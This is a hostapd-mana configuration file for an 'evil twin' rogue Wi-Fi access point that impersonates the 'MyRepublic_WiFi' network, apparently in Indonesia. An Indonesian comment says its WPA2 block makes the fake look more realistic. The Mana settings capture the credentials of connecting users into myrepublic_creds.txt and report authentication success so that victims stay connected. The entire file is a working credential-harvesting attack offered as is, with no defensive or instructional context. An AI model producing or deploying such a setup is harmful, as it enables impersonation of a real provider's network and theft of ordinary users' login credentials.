# Evil Twin MyRepublic Configuration
interface=wlan0
driver=nl80211
ssid=MyRepublic_WiFi
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# WPA2 Configuration (optional - untuk membuat lebih realistis)
wpa=2
wpa_passphrase=myrepublic123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP

# Mana Configuration (core only)
mana_wpe=1
mana_credout=myrepublic_creds.txt
mana_eapsuccess=1

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

# Beacon interval
beacon_int=100

# DTIM period
dtim_period=2

# Maximum number of stations
max_num_sta=200

# Disassociate stations after inactivity
ap_max_inactivity=300

# Enable IEEE 802.11d
ieee80211d=1
country_code=ID

# Enable IEEE 802.11n only (802.11ac removed for compatibility)
ieee80211n=1
ht_capab=[HT40+][SHORT-GI-20][SHORT-GI-40][DSSS_CCK-40] 